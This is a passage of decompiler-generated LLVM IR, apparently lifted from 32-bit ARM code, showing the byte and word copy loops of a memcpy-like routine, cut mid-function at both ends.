  %v7_18ce4 = icmp eq i32 %v1_18cdc, 4
  store i1 %v7_18ce4, i1* %cpsr_z.global-to-local, align 1
  %v2_18ce8 = xor i1 %v6_18ce4, %v5_18ce4
  %v3_18ce8 = load i32, i32* @r1, align 4
  %v4_18ce8 = inttoptr i32 %v3_18ce8 to i32*
  %v5_18ce8 = load i32, i32* %v4_18ce8, align 4
  store i32 %v5_18ce8, i32* @r3, align 4
  %v7_18ce8 = add i32 %v3_18ce8, 4
  br i1 %v2_18ce8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_18ce4
  store i32 %v7_18ce8, i32* @r1, align 4
  %v5_18cec = inttoptr i32 %v4_18cec to i32*
  store i32 %v5_18ce8, i32* %v5_18cec, align 4
  %v6_18cec = load i32, i32* @r0, align 4
  %v7_18cec = add i32 %v6_18cec, 4
  store i32 %v7_18cec, i32* @r0, align 4
  %v0_18cfc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_18ce4
  %v7_18cf0 = inttoptr i32 %v7_18ce8 to i32*
  %v8_18cf0 = load i32, i32* %v7_18cf0, align 4
  store i32 %v8_18cf0, i32* @ip, align 4
  %v9_18cf0 = add i32 %v3_18ce8, 8
  store i32 %v9_18cf0, i32* @r1, align 4
  %v4_18cf4 = inttoptr i32 %v4_18cec to i32*
  store i32 %v5_18ce8, i32* %v4_18cf4, align 4
  %v6_18cf4 = add i32 %v4_18cec, 4
  %v7_18cf4 = inttoptr i32 %v6_18cf4 to i32*
  %v8_18cf4 = load i32, i32* @ip, align 4
  store i32 %v8_18cf4, i32* %v7_18cf4, align 4
  %v9_18cf4 = add i32 %v4_18cec, 8
  store i32 %v9_18cf4, i32* @r0, align 4
  %v3_18cf8 = load i32, i32* %r2.global-to-local, align 4
  %v4_18cf8 = add i32 %v3_18cf8, -4
  store i32 %v4_18cf8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_18cdc, %bb, %dec_label_pc_18eac, %dec_label_pc_18e40, %dec_label_pc_18dd4, %bb139
  %v0_18cfc = phi i32 [ %v0_18cfc.pre, %.thread122 ], [ %v2_18d4c, %.thread128 ], [ %v1_18cdc, %dec_label_pc_18cdc ], [ %v2_18c70, %bb ], [ %v0_18cfc61, %dec_label_pc_18eac ], [ %v0_18cfc60, %dec_label_pc_18e40 ], [ %v0_18cfc59, %dec_label_pc_18dd4 ], [ %v4_18cf8, %bb139 ]
  %v1_18cfc = add i32 %v0_18cfc, 4
  store i32 %v1_18cfc, i32* %r2.global-to-local, align 4
  %v3_18cfc = sub i32 0, %v0_18cfc
  %v4_18cfc = and i32 %v1_18cfc, %v3_18cfc
  %v5_18cfc = icmp slt i32 %v4_18cfc, 0
  store i1 %v5_18cfc, i1* %cpsr_v.global-to-local, align 1
  %v6_18cfc = icmp slt i32 %v1_18cfc, 0
  store i1 %v6_18cfc, i1* %cpsr_n.global-to-local, align 1
  %v7_18cfc = icmp eq i32 %v1_18cfc, 0
  store i1 %v7_18cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cfc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_18d04.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_18d00 = load i8*, i8** %stack_var_-8, align 4
  %v4_18d00 = ptrtoint i8* %v3_18d00 to i32
  store i32 %v4_18d00, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_18d04 = phi i32 [ %v0_18d04.pre, %bb140.bb142_crit_edge ], [ %v8_18c6c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_18cfc, i32 %v0_18d04)
  %v0_18d08 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d08 = add i32 %v0_18d08, -2
  %v3_18d08 = sub i32 1, %v0_18d08
  %v4_18d08 = and i32 %v3_18d08, %v0_18d08
  %v5_18d08 = icmp slt i32 %v4_18d08, 0
  store i1 %v5_18d08, i1* %cpsr_v.global-to-local, align 1
  %v6_18d08 = icmp slt i32 %v1_18d08, 0
  store i1 %v6_18d08, i1* %cpsr_n.global-to-local, align 1
  %v7_18d08 = icmp eq i32 %v0_18d08, 2
  store i1 %v7_18d08, i1* %cpsr_z.global-to-local, align 1
  %v0_18d0c = load i32, i32* @r1, align 4
  %v1_18d0c = inttoptr i32 %v0_18d0c to i8*
  %v2_18d0c = load i8, i8* %v1_18d0c, align 1
  %v5_18d0c = add i32 %v0_18d0c, 1
  store i32 %v5_18d0c, i32* %r1.global-to-local, align 4
  %v2_18d10 = load i32, i32* @r0, align 4
  %v3_18d10 = inttoptr i32 %v2_18d10 to i8*
  store i8 %v2_18d0c, i8* %v3_18d10, align 1
  %v4_18d10 = load i32, i32* @r0, align 4
  %v5_18d10 = add i32 %v4_18d10, 1
  store i32 %v5_18d10, i32* %r0.global-to-local, align 4
  %v0_18d14 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18d14 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18d14 = xor i1 %v0_18d14, %v1_18d14
  br i1 %v2_18d14, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_18d14 = load i32, i32* %r1.global-to-local, align 4
  %v4_18d14 = inttoptr i32 %v3_18d14 to i8*
  %v5_18d14 = load i8, i8* %v4_18d14, align 1
  %v8_18d14 = add i32 %v3_18d14, 1
  store i32 %v8_18d14, i32* %r1.global-to-local, align 4
  %v6_18d18 = inttoptr i32 %v5_18d10 to i8*
  store i8 %v5_18d14, i8* %v6_18d18, align 1
  %v7_18d18 = load i32, i32* %r0.global-to-local, align 4
  %v8_18d18 = add i32 %v7_18d18, 1
  store i32 %v8_18d18, i32* %r0.global-to-local, align 4
  %v1_18d1c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18d1c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_18d20 = phi i32 [ %v8_18d18, %bb143 ], [ %v5_18d10, %bb142 ]
  %v2_18d20 = phi i1 [ %v2_18d1c.pre, %bb143 ], [ %v1_18d14, %bb142 ]
  %v1_18d20 = phi i1 [ %v1_18d1c.pre, %bb143 ], [ %v0_18d14, %bb142 ]
  %v0_18d1c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18d1c = xor i1 %v2_18d20, %v1_18d20
  %v4_18d1c = or i1 %v0_18d1c, %v3_18d1c
  br i1 %v4_18d1c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_18d1c = load i32, i32* %r1.global-to-local, align 4
  %v6_18d1c = inttoptr i32 %v5_18d1c to i8*
  %v7_18d1c = load i8, i8* %v6_18d1c, align 1
  %v10_18d1c = add i32 %v5_18d1c, 1
  store i32 %v10_18d1c, i32* %r1.global-to-local, align 4
  %v8_18d20 = inttoptr i32 %v7_18d20 to i8*
  store i8 %v7_18d1c, i8* %v8_18d20, align 1
  %v9_18d20 = load i32, i32* %r0.global-to-local, align 4
  %v10_18d20 = add i32 %v9_18d20, 1
  store i32 %v10_18d20, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_18d24 = load i8*, i8** %stack_var_-8, align 4
  %v3_18d24 = ptrtoint i8* %v2_18d24 to i32
  store i32 %v3_18d24, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_18c6c)
  %v0_18d2c.pre = load i32, i32* @ip, align 4
  %v0_18d34.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_18d38.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_18d2c

dec_label_pc_18d2c:                               ; preds = %dec_label_pc_18c78, %.thread126
  %v2_18d38 = phi i32 [ %v1_18c60, %dec_label_pc_18c78 ], [ %v2_18d38.pre, %.thread126 ]
  %v0_18d34 = phi i32 [ %v0_18c60, %dec_label_pc_18c78 ], [ %v0_18d34.pre, %.thread126 ]
  %v0_18d2c = phi i32 [ %v1_18c78, %dec_label_pc_18c78 ], [ %v0_18d2c.pre, %.thread126 ]
  %v1_18d2c = sub i32 4, %v0_18d2c
  store i32 %v1_18d2c, i32* @ip, align 4
  %v1_18d30 = add i32 %v1_18d2c, -2
  %v3_18d30 = sub i32 1, %v1_18d2c
  %v4_18d30 = and i32 %v3_18d30, %v1_18d2c
  %v5_18d30 = icmp slt i32 %v4_18d30, 0
  store i1 %v5_18d30, i1* %cpsr_v.global-to-local, align 1
  %v6_18d30 = icmp slt i32 %v1_18d30, 0
  store i1 %v6_18d30, i1* %cpsr_n.global-to-local, align 1
  %v7_18d30 = icmp eq i32 %v1_18d2c, 2
  store i1 %v7_18d30, i1* %cpsr_z.global-to-local, align 1
  %v1_18d34 = inttoptr i32 %v0_18d34 to i8*
  %v2_18d34 = load i8, i8* %v1_18d34, align 1
  %v3_18d34 = zext i8 %v2_18d34 to i32
  store i32 %v3_18d34, i32* @r3, align 4
  %v5_18d34 = add i32 %v0_18d34, 1
  store i32 %v5_18d34, i32* @r1, align 4
  %v3_18d38 = inttoptr i32 %v2_18d38 to i8*
  store i8 %v2_18d34, i8* %v3_18d38, align 1
  %v4_18d38 = load i32, i32* @r0, align 4
  %v5_18d38 = add i32 %v4_18d38, 1
  store i32 %v5_18d38, i32* @r0, align 4
  %v0_18d3c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18d3c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18d3c = xor i1 %v0_18d3c, %v1_18d3c
  br i1 %v2_18d3c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_18d2c
  %v3_18d3c = load i32, i32* @r1, align 4
  %v4_18d3c = inttoptr i32 %v3_18d3c to i8*
  %v5_18d3c = load i8, i8* %v4_18d3c, align 1
  %v6_18d3c = zext i8 %v5_18d3c to i32
  store i32 %v6_18d3c, i32* @r3, align 4
  %v8_18d3c = add i32 %v3_18d3c, 1
  store i32 %v8_18d3c, i32* @r1, align 4
  %v6_18d40 = inttoptr i32 %v5_18d38 to i8*
  store i8 %v5_18d3c, i8* %v6_18d40, align 1
  %v7_18d40 = load i32, i32* @r0, align 4
  %v8_18d40 = add i32 %v7_18d40, 1
  store i32 %v8_18d40, i32* @r0, align 4
  %v1_18d44.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18d44.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_18d2c, %bb145
  %v7_18d48 = phi i32 [ %v8_18d40, %bb145 ], [ %v5_18d38, %dec_label_pc_18d2c ]
  %v2_18d48 = phi i1 [ %v2_18d44.pre, %bb145 ], [ %v1_18d3c, %dec_label_pc_18d2c ]
  %v1_18d48 = phi i1 [ %v1_18d44.pre, %bb145 ], [ %v0_18d3c, %dec_label_pc_18d2c ]
  %v0_18d44 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18d44 = xor i1 %v2_18d48, %v1_18d48
  %v4_18d44 = or i1 %v0_18d44, %v3_18d44
  br i1 %v4_18d44, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18d44 = load i32, i32* @r1, align 4
  %v6_18d44 = inttoptr i32 %v5_18d44 to i8*
  %v7_18d44 = load i8, i8* %v6_18d44, align 1
  %v8_18d44 = zext i8 %v7_18d44 to i32
  store i32 %v8_18d44, i32* @r3, align 4
  %v10_18d44 = add i32 %v5_18d44, 1
  store i32 %v10_18d44, i32* @r1, align 4
  %v8_18d48 = inttoptr i32 %v7_18d48 to i8*
  store i8 %v7_18d44, i8* %v8_18d48, align 1
  %v9_18d48 = load i32, i32* @r0, align 4
  %v10_18d48 = add i32 %v9_18d48, 1
  store i32 %v10_18d48, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_18e7c77 = phi i32 [ %v10_18d48, %bb146 ], [ %v7_18d48, %.thread127 ]
  %v0_18d4c = load i32, i32* %r2.global-to-local, align 4
  %v1_18d4c = load i32, i32* @ip, align 4
  %v2_18d4c = sub i32 %v0_18d4c, %v1_18d4c
  store i32 %v2_18d4c, i32* %r2.global-to-local, align 4
  %v4_18d4c = xor i32 %v1_18d4c, %v0_18d4c
  %v5_18d4c = xor i32 %v2_18d4c, %v0_18d4c
  %v6_18d4c = and i32 %v5_18d4c, %v4_18d4c
  %v7_18d4c = icmp slt i32 %v6_18d4c, 0
  store i1 %v7_18d4c, i1* %cpsr_v.global-to-local, align 1
  %v8_18d4c = icmp slt i32 %v2_18d4c, 0
  store i1 %v8_18d4c, i1* %cpsr_n.global-to-local, align 1
  %v9_18d4c = icmp eq i32 %v0_18d4c, %v1_18d4c
  store i1 %v9_18d4c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d50 = xor i1 %v8_18d4c, %v7_18d4c
  br i1 %v2_18d50, label %bb140, label %dec_label_pc_18d54

dec_label_pc_18d54:                               ; preds = %.thread128
  %v0_18d54 = load i32, i32* @r1, align 4
  %v1_18d54 = urem i32 %v0_18d54, 4
  store i32 %v1_18d54, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18d54 = icmp eq i32 %v1_18d54, 0
  store i1 %v2_18d54, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18d54 to i2
  br i1 %v2_18d54, label %dec_label_pc_18c88, label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18c80, %dec_label_pc_18d54
  %v0_18e7c76 = phi i32 [ %v1_18c60, %dec_label_pc_18c80 ], [ %v0_18e7c77, %dec_label_pc_18d54 ]
  %v0_18de4 = phi i32 [ %v2_18c70, %dec_label_pc_18c80 ], [ %v2_18d4c, %dec_label_pc_18d54 ]
  %v0_18d64.off0 = phi i2 [ %extract.t, %dec_label_pc_18c80 ], [ %extract.t131, %dec_label_pc_18d54 ]
  %v0_18d5c = phi i32 [ %v0_18c60, %dec_label_pc_18c80 ], [ %v0_18d54, %dec_label_pc_18d54 ]
  %v1_18d5c = and i32 %v0_18d5c, -4
  store i32 %v1_18d5c, i32* %r1.global-to-local, align 4
  %v1_18d60 = inttoptr i32 %v1_18d5c to i32*
  %v2_18d60 = load i32, i32* %v1_18d60, align 4
  store i32 %v2_18d60, i32* %lr.global-to-local, align 4
  %v4_18d60 = add i32 %v1_18d5c, 4
  store i32 %v4_18d60, i32* %r1.global-to-local, align 4
  %v1_18ddc = add i32 %v0_18de4, -12
  %v3_18ddc = sub i32 11, %v0_18de4
  %v4_18ddc = and i32 %v3_18ddc, %v0_18de4
  %v5_18ddc = icmp slt i32 %v4_18ddc, 0
  store i1 %v5_18ddc, i1* %cpsr_v.global-to-local, align 1
  %v6_18ddc = icmp slt i32 %v1_18ddc, 0
  store i1 %v6_18ddc, i1* %cpsr_n.global-to-local, align 1
  %v7_18ddc = icmp eq i32 %v0_18de4, 12
  store i1 %v7_18ddc, i1* %cpsr_z.global-to-local, align 1
  %v2_18de0 = xor i1 %v6_18ddc, %v5_18ddc
  switch i2 %v0_18d64.off0, label %dec_label_pc_18d70 [
    i2 -1, label %dec_label_pc_18e48
    i2 -2, label %dec_label_pc_18ddc
  ]

dec_label_pc_18d70:                               ; preds = %dec_label_pc_18d5c
  br i1 %v2_18de0, label %dec_label_pc_18dbc, label %dec_label_pc_18d78

dec_label_pc_18d78:                               ; preds = %dec_label_pc_18d70
  store i32 %v1_18ddc, i32* %r2.global-to-local, align 4
  %v3_18d7c = load i32, i32* @r4, align 4
  store i32 %v3_18d7c, i32* %stack_var_-16, align 4
  %v6_18d7c = load i32, i32* @r5, align 4
  store i32 %v6_18d7c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18d80

dec_label_pc_18d80:                               ; preds = %dec_label_pc_18d80.dec_label_pc_18d80_crit_edge, %dec_label_pc_18d78
  %v0_18da4 = phi i32 [ %v12_18da4, %dec_label_pc_18d80.dec_label_pc_18d80_crit_edge ], [ %v0_18e7c76, %dec_label_pc_18d78 ]
  %v0_18d84 = phi i32 [ %v0_18d84.pre, %dec_label_pc_18d80.dec_label_pc_18d80_crit_edge ], [ %v4_18d60, %dec_label_pc_18d78 ]
  %v0_18d80 = phi i32 [ %v0_18d80.pre, %dec_label_pc_18d80.dec_label_pc_18d80_crit_edge ], [ %v2_18d60, %dec_label_pc_18d78 ]
  %v3_18d80 = udiv i32 %v0_18d80, 256
  %v1_18d84 = inttoptr i32 %v0_18d84 to i32*
  %v2_18d84 = load i32, i32* %v1_18d84, align 4
  store i32 %v2_18d84, i32* %r4.global-to-local, align 4
  %v3_18d84 = add i32 %v0_18d84, 4
  %v4_18d84 = inttoptr i32 %v3_18d84 to i32*
  %v5_18d84 = load i32, i32* %v4_18d84, align 4
  store i32 %v5_18d84, i32* %r5.global-to-local, align 4
  %v6_18d84 = add i32 %v0_18d84, 8
  %v7_18d84 = inttoptr i32 %v6_18d84 to i32*
  %v8_18d84 = load i32, i32* %v7_18d84, align 4
  store i32 %v8_18d84, i32* %ip.global-to-local, align 4
  %v9_18d84 = add i32 %v0_18d84, 12
  %v10_18d84 = inttoptr i32 %v9_18d84 to i32*
  %v11_18d84 = load i32, i32* %v10_18d84, align 4
  store i32 %v11_18d84, i32* %lr.global-to-local, align 4
  %v12_18d84 = add i32 %v0_18d84, 16
  store i32 %v12_18d84, i32* %r1.global-to-local, align 4
  %v4_18d88 = mul i32 %v2_18d84, 16777216
  %v5_18d88 = or i32 %v4_18d88, %v3_18d80
  store i32 %v5_18d88, i32* @r3, align 4
  %v3_18d8c = udiv i32 %v2_18d84, 256
  %v4_18d90 = mul i32 %v5_18d84, 16777216
  %v5_18d90 = or i32 %v4_18d90, %v3_18d8c
  store i32 %v5_18d90, i32* %r4.global-to-local, align 4
  %v3_18d94 = udiv i32 %v5_18d84, 256
  %v4_18d98 = mul i32 %v8_18d84, 16777216
  %v5_18d98 = or i32 %v4_18d98, %v3_18d94
  store i32 %v5_18d98, i32* %r5.global-to-local, align 4
  %v3_18d9c = udiv i32 %v8_18d84, 256
  %v4_18da0 = mul i32 %v11_18d84, 16777216
  %v5_18da0 = or i32 %v4_18da0, %v3_18d9c
  store i32 %v5_18da0, i32* @ip, align 4
  %v1_18da4 = inttoptr i32 %v0_18da4 to i32*
  store i32 %v5_18d88, i32* %v1_18da4, align 4
  %v3_18da4 = add i32 %v0_18da4, 4
  %v4_18da4 = inttoptr i32 %v3_18da4 to i32*
  %v5_18da4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18da4, i32* %v4_18da4, align 4
  %v6_18da4 = add i32 %v0_18da4, 8
  %v7_18da4 = inttoptr i32 %v6_18da4 to i32*
  %v8_18da4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18da4, i32* %v7_18da4, align 4
  %v9_18da4 = add i32 %v0_18da4, 12
  %v10_18da4 = inttoptr i32 %v9_18da4 to i32*
  %v11_18da4 = load i32, i32* @ip, align 4
  store i32 %v11_18da4, i32* %v10_18da4, align 4
  %v12_18da4 = add i32 %v0_18da4, 16
  store i32 %v12_18da4, i32* @r0, align 4
  %v0_18da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18da8 = add i32 %v0_18da8, -16
  store i32 %v1_18da8, i32* %r2.global-to-local, align 4
  %v3_18da8 = sub i32 15, %v0_18da8
  %v4_18da8 = and i32 %v3_18da8, %v0_18da8
  %v5_18da8 = icmp slt i32 %v4_18da8, 0
  %v6_18da8 = icmp slt i32 %v1_18da8, 0
  %v2_18dac = xor i1 %v6_18da8, %v5_18da8
  br i1 %v2_18dac, label %dec_label_pc_18db0, label %dec_label_pc_18d80.dec_label_pc_18d80_crit_edge

dec_label_pc_18d80.dec_label_pc_18d80_crit_edge:  ; preds = %dec_label_pc_18d80
  %v0_18d80.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18d84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d80

dec_label_pc_18db0:                               ; preds = %dec_label_pc_18d80
  %v2_18db0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18db0, i32* @r4, align 4
  %v5_18db0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18db0, i32* @r5, align 4
  %v1_18db4 = add i32 %v0_18da8, -4
  store i32 %v1_18db4, i32* %r2.global-to-local, align 4
  %v3_18db4 = add i32 %v0_18da8, 2147483632
  %v4_18db4 = and i32 %v1_18db4, %v3_18db4
  %v5_18db4 = icmp slt i32 %v4_18db4, 0
  store i1 %v5_18db4, i1* %cpsr_v.global-to-local, align 1
  %v6_18db4 = icmp slt i32 %v1_18db4, 0
  store i1 %v6_18db4, i1* %cpsr_n.global-to-local, align 1
  %v7_18db4 = icmp eq i32 %v1_18db4, 0
  store i1 %v7_18db4, i1* %cpsr_z.global-to-local, align 1
  %v2_18db8 = xor i1 %v6_18db4, %v5_18db4
  br i1 %v2_18db8, label %dec_label_pc_18dd4, label %dec_label_pc_18dbc

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18db0, %dec_label_pc_18d70, %dec_label_pc_18dbc
  %v1_18dc8 = phi i32 [ %v4_18dc8, %dec_label_pc_18dbc ], [ %v12_18da4, %dec_label_pc_18db0 ], [ %v0_18e7c76, %dec_label_pc_18d70 ]
  %v0_18dbc = load i32, i32* %lr.global-to-local, align 4
  %v3_18dbc = udiv i32 %v0_18dbc, 256
  store i32 %v3_18dbc, i32* %ip.global-to-local, align 4
  %v0_18dc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18dc0 = inttoptr i32 %v0_18dc0 to i32*
  %v2_18dc0 = load i32, i32* %v1_18dc0, align 4
  store i32 %v2_18dc0, i32* %lr.global-to-local, align 4
  %v4_18dc0 = add i32 %v0_18dc0, 4
  store i32 %v4_18dc0, i32* %r1.global-to-local, align 4
  %v4_18dc4 = mul i32 %v2_18dc0, 16777216
  %v5_18dc4 = or i32 %v4_18dc4, %v3_18dbc
  store i32 %v5_18dc4, i32* @ip, align 4
  %v2_18dc8 = inttoptr i32 %v1_18dc8 to i32*
  store i32 %v5_18dc4, i32* %v2_18dc8, align 4
  %v3_18dc8 = load i32, i32* @r0, align 4
  %v4_18dc8 = add i32 %v3_18dc8, 4
  store i32 %v4_18dc8, i32* @r0, align 4
  %v0_18dcc = load i32, i32* %r2.global-to-local, align 4
  %v1_18dcc = add i32 %v0_18dcc, -4
  store i32 %v1_18dcc, i32* %r2.global-to-local, align 4
  %v3_18dcc = sub i32 3, %v0_18dcc
  %v4_18dcc = and i32 %v3_18dcc, %v0_18dcc
  %v5_18dcc = icmp slt i32 %v4_18dcc, 0
  %v6_18dcc = icmp slt i32 %v1_18dcc, 0
  %v2_18dd0 = xor i1 %v6_18dcc, %v5_18dcc
  br i1 %v2_18dd0, label %dec_label_pc_18dd4.loopexit, label %dec_label_pc_18dbc

dec_label_pc_18dd4.loopexit:                      ; preds = %dec_label_pc_18dbc
  %v7_18dcc = icmp eq i32 %v0_18dcc, 4
  store i1 %v5_18dcc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18dcc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18dcc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18dd4

dec_label_pc_18dd4:                               ; preds = %dec_label_pc_18dd4.loopexit, %dec_label_pc_18db0
  %v0_18cfc59 = phi i32 [ %v1_18dcc, %dec_label_pc_18dd4.loopexit ], [ %v1_18db4, %dec_label_pc_18db0 ]
  %v0_18dd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18dd4 = add i32 %v0_18dd4, -3
  store i32 %v1_18dd4, i32* @r1, align 4
  br label %bb140

dec_label_pc_18ddc:                               ; preds = %dec_label_pc_18d5c
  br i1 %v2_18de0, label %dec_label_pc_18e28, label %dec_label_pc_18de4

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18ddc
  store i32 %v1_18ddc, i32* %r2.global-to-local, align 4
  %v3_18de8 = load i32, i32* @r4, align 4
  store i32 %v3_18de8, i32* %stack_var_-16, align 4
  %v6_18de8 = load i32, i32* @r5, align 4
  store i32 %v6_18de8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18dec.dec_label_pc_18dec_crit_edge, %dec_label_pc_18de4
  %v0_18e10 = phi i32 [ %v12_18e10, %dec_label_pc_18dec.dec_label_pc_18dec_crit_edge ], [ %v0_18e7c76, %dec_label_pc_18de4 ]
  %v0_18df0 = phi i32 [ %v0_18df0.pre, %dec_label_pc_18dec.dec_label_pc_18dec_crit_edge ], [ %v4_18d60, %dec_label_pc_18de4 ]
  %v0_18dec = phi i32 [ %v0_18dec.pre, %dec_label_pc_18dec.dec_label_pc_18dec_crit_edge ], [ %v2_18d60, %dec_label_pc_18de4 ]
  %v3_18dec = udiv i32 %v0_18dec, 65536
  %v1_18df0 = inttoptr i32 %v0_18df0 to i32*
  %v2_18df0 = load i32, i32* %v1_18df0, align 4
  store i32 %v2_18df0, i32* %r4.global-to-local, align 4
  %v3_18df0 = add i32 %v0_18df0, 4
  %v4_18df0 = inttoptr i32 %v3_18df0 to i32*
  %v5_18df0 = load i32, i32* %v4_18df0, align 4
  store i32 %v5_18df0, i32* %r5.global-to-local, align 4
  %v6_18df0 = add i32 %v0_18df0, 8
  %v7_18df0 = inttoptr i32 %v6_18df0 to i32*
  %v8_18df0 = load i32, i32* %v7_18df0, align 4
  store i32 %v8_18df0, i32* %ip.global-to-local, align 4
  %v9_18df0 = add i32 %v0_18df0, 12
  %v10_18df0 = inttoptr i32 %v9_18df0 to i32*
  %v11_18df0 = load i32, i32* %v10_18df0, align 4
  store i32 %v11_18df0, i32* %lr.global-to-local, align 4
  %v12_18df0 = add i32 %v0_18df0, 16
  store i32 %v12_18df0, i32* %r1.global-to-local, align 4
  %v4_18df4 = mul i32 %v2_18df0, 65536
  %v5_18df4 = or i32 %v4_18df4, %v3_18dec
  store i32 %v5_18df4, i32* @r3, align 4
  %v3_18df8 = udiv i32 %v2_18df0, 65536
  %v4_18dfc = mul i32 %v5_18df0, 65536
  %v5_18dfc = or i32 %v4_18dfc, %v3_18df8
  store i32 %v5_18dfc, i32* %r4.global-to-local, align 4
  %v3_18e00 = udiv i32 %v5_18df0, 65536
  %v4_18e04 = mul i32 %v8_18df0, 65536
  %v5_18e04 = or i32 %v4_18e04, %v3_18e00
  store i32 %v5_18e04, i32* %r5.global-to-local, align 4
  %v3_18e08 = udiv i32 %v8_18df0, 65536
  %v4_18e0c = mul i32 %v11_18df0, 65536
  %v5_18e0c = or i32 %v4_18e0c, %v3_18e08
  store i32 %v5_18e0c, i32* @ip, align 4
  %v1_18e10 = inttoptr i32 %v0_18e10 to i32*
  store i32 %v5_18df4, i32* %v1_18e10, align 4
  %v3_18e10 = add i32 %v0_18e10, 4
  %v4_18e10 = inttoptr i32 %v3_18e10 to i32*
  %v5_18e10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18e10, i32* %v4_18e10, align 4
  %v6_18e10 = add i32 %v0_18e10, 8
  %v7_18e10 = inttoptr i32 %v6_18e10 to i32*
  %v8_18e10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18e10, i32* %v7_18e10, align 4
  %v9_18e10 = add i32 %v0_18e10, 12
  %v10_18e10 = inttoptr i32 %v9_18e10 to i32*
  %v11_18e10 = load i32, i32* @ip, align 4
  store i32 %v11_18e10, i32* %v10_18e10, align 4
  %v12_18e10 = add i32 %v0_18e10, 16
  store i32 %v12_18e10, i32* @r0, align 4
  %v0_18e14 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e14 = add i32 %v0_18e14, -16
  store i32 %v1_18e14, i32* %r2.global-to-local, align 4
  %v3_18e14 = sub i32 15, %v0_18e14
  %v4_18e14 = and i32 %v3_18e14, %v0_18e14
  %v5_18e14 = icmp slt i32 %v4_18e14, 0
  %v6_18e14 = icmp slt i32 %v1_18e14, 0
  %v2_18e18 = xor i1 %v6_18e14, %v5_18e14
  br i1 %v2_18e18, label %dec_label_pc_18e1c, label %dec_label_pc_18dec.dec_label_pc_18dec_crit_edge

dec_label_pc_18dec.dec_label_pc_18dec_crit_edge:  ; preds = %dec_label_pc_18dec
  %v0_18dec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18df0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18e1c:                               ; preds = %dec_label_pc_18dec
  %v2_18e1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18e1c, i32* @r4, align 4
  %v5_18e1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18e1c, i32* @r5, align 4
  %v1_18e20 = add i32 %v0_18e14, -4
  store i32 %v1_18e20, i32* %r2.global-to-local, align 4
  %v3_18e20 = add i32 %v0_18e14, 2147483632
  %v4_18e20 = and i32 %v1_18e20, %v3_18e20
  %v5_18e20 = icmp slt i32 %v4_18e20, 0
  store i1 %v5_18e20, i1* %cpsr_v.global-to-local, align 1
  %v6_18e20 = icmp slt i32 %v1_18e20, 0
  store i1 %v6_18e20, i1* %cpsr_n.global-to-local, align 1
  %v7_18e20 = icmp eq i32 %v1_18e20, 0
  store i1 %v7_18e20, i1* %cpsr_z.global-to-local, align 1
  %v2_18e24 = xor i1 %v6_18e20, %v5_18e20
  br i1 %v2_18e24, label %dec_label_pc_18e40, label %dec_label_pc_18e28

dec_label_pc_18e28:                               ; preds = %dec_label_pc_18e1c, %dec_label_pc_18ddc, %dec_label_pc_18e28
